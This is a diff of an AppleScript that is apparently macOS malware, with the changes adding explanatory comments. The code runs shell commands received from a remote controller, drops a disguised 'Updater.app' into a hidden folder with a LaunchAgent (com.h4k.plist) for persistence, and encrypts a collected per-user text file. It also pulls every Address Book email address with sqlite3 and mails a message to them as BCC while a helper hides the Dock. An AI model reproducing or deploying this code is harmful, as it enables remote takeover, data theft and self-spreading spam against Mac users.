@@ -24,17 +24,19 @@ try
 			end try
 		end try
 		return
-	else if remotecommand = "hold" then
+	else if remotecommand = "hold" then -- If the command is to hold then exit
 		return
 	else
 		set comms to paragraphs of remotecommand
 		repeat with comm in comms
-			if comm contains "shell" then
-				set newremotecommand to (do shell script "echo " & comm & " | cut -d ':' -f 2")
-				do shell script newremotecommand
-			else if comm contains "encpass" then
+			if comm contains "shell" then -- If there is a shell command:
+				set newremotecommand to (do shell script "echo " & comm & " | cut -d ':' -f 2") -- Format
+				try
+					do shell script quoted form of newremotecommand
+				end try
+			else if comm contains "encpass" then -- Should the text file be encrypted?
 				set encpass to (do shell script "echo " & comm & " | cut -d ':' -f 2")
-			else if remotecommand contains "mail" then
+			else if remotecommand contains "mail" then -- Should a message be made?
 				set enablemail to (do shell script "echo " & comm & " | cut -d ':' -f 2") as boolean
 			end if
 		end repeat
@@ -46,9 +48,9 @@ end try
 try
 	set reso to quoted form of POSIX path of (path to resource "Updater.app")
 	set newreso to POSIX path of ("" & ufld & "Updater.app")
-	do shell script "cp -r " & reso & " " & newreso
+	do shell script "cp -r " & reso & " " & newreso -- Copy duplicate app
 	
-	do shell script "touch ~/Library/LaunchAgents/com.h4k.plist"
+	do shell script "touch ~/Library/LaunchAgents/com.h4k.plist" -- Make a launchagent for startup
 	do shell script "defaults write ~/Library/LaunchAgents/com.h4k.plist Label 'com.h4k.plist'"
 	do shell script "defaults write ~/Library/LaunchAgents/com.h4k.plist Program '/Users/" & theuser & "/Public/." & theuser & "/Updater.app/Contents/MacOS/applet'"
 	do shell script "defaults write ~/Library/LaunchAgents/com.h4k.plist RunAtLoad -bool true"
@@ -93,7 +95,7 @@ try
 end try
 
 try
-	do shell script "openssl enc -aes-256-cbc -salt -in " & ufld & theuser & ".txt -out " & ufld & theuser & ".enc -pass pass:" & encpass
+	do shell script "openssl enc -aes-256-cbc -salt -in " & ufld & theuser & ".txt -out " & ufld & theuser & ".enc -pass pass:" & encpass -- Encrypt the file if there is an encpass
 	do shell script "rm " & ufld & theuser & ".txt"
 end try
 
@@ -110,7 +112,7 @@ end try
 try
 	if enablemail is true then
 		try
-			do shell script "open " & (POSIX path of (path to resource "DK.app"))
+			do shell script "open " & (POSIX path of (path to resource "DK.app")) -- Kill dock
 			delay 0.5
 		end try
 		
@@ -122,7 +124,7 @@ try
 	
 	" & theuser & ""} -- Make email message
 				
-				set txt to paragraphs of (do shell script "sqlite3 ~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb \"select ZADDRESSNORMALIZED from ZABCDEMAILADDRESS;\" | sort | uniq")
+				set txt to paragraphs of (do shell script "sqlite3 ~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb \"select ZADDRESSNORMALIZED from ZABCDEMAILADDRESS;\" | sort | uniq") -- Get addresses
 				repeat with x from 1 to (count of txt)
 					tell theMessage
 						make new bcc recipient at end of to recipients with properties {address:(item x of txt)} -- Add recipients to message
@@ -143,7 +145,7 @@ try
 		
 		try
 			set the_pid to (do shell script "ps ax | grep " & (quoted form of "DK") & " | grep -v grep | awk '{print $1}'")
-			if the_pid is not "" then do shell script ("kill -9 " & the_pid)
+			if the_pid is not "" then do shell script ("kill -9 " & the_pid) -- Reload dock
 		end try
 	end if
 on error
